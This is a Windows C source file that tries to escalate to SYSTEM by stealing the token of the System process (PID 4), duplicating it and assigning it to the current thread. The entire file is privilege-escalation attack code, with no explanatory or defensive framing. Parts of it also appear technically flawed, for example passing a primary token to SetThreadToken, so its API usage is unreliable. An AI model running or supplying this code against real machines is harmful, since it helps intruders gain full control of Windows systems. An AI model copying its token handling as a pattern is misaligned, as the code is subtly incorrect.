#include <windows.h>
#include <stdio.h>

void enableAssignPrimaryTokenPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Open the current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed (Error: %lu)\n", GetLastError());
        return;
    }

    // Look up the LUID for the "Assign Primary Token" privilege
    if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid)) {
        printf("LookupPrivilegeValue failed (Error: %lu)\n", GetLastError());
        CloseHandle(hToken);
        return;
    }

    // Set up the TOKEN_PRIVILEGES structure
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("AdjustTokenPrivileges failed (Error: %lu)\n", GetLastError());
    }

    CloseHandle(hToken);
}

HANDLE getSystemToken() {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, FALSE, 4); // PID 4 is SYSTEM
    if (!hProcess) {
        printf("OpenProcess failed (Error: %lu)\n", GetLastError());
        return NULL;
    }

    HANDLE hToken;
    // Open the process token
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        printf("OpenProcessToken failed (Error: %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    CloseHandle(hProcess); // Close the process handle
    return hToken; // Return the token handle
}

int main() {
    enableAssignPrimaryTokenPrivilege(); // Enable necessary privileges

    HANDLE hSystemToken = getSystemToken();
    if (hSystemToken) {
        HANDLE hPrimaryToken;
        // Duplicate the SYSTEM token to create a primary token
        if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
            printf("DuplicateTokenEx failed (Error: %lu)\n", GetLastError());
            CloseHandle(hSystemToken);
            return 1;
        }

        // Set the thread token to the primary SYSTEM token
        if (!SetThreadToken(NULL, hPrimaryToken)) {
            printf("SetThreadToken failed (Error: %lu)\n", GetLastError());
        } else {
            printf("Successfully set SYSTEM token as primary token.\n");
        }

        CloseHandle(hPrimaryToken); // Close the duplicated token handle
        CloseHandle(hSystemToken); // Close the original SYSTEM token handle
    } else {
        printf("Failed to obtain SYSTEM token.\n");
    }

    return 0;
}
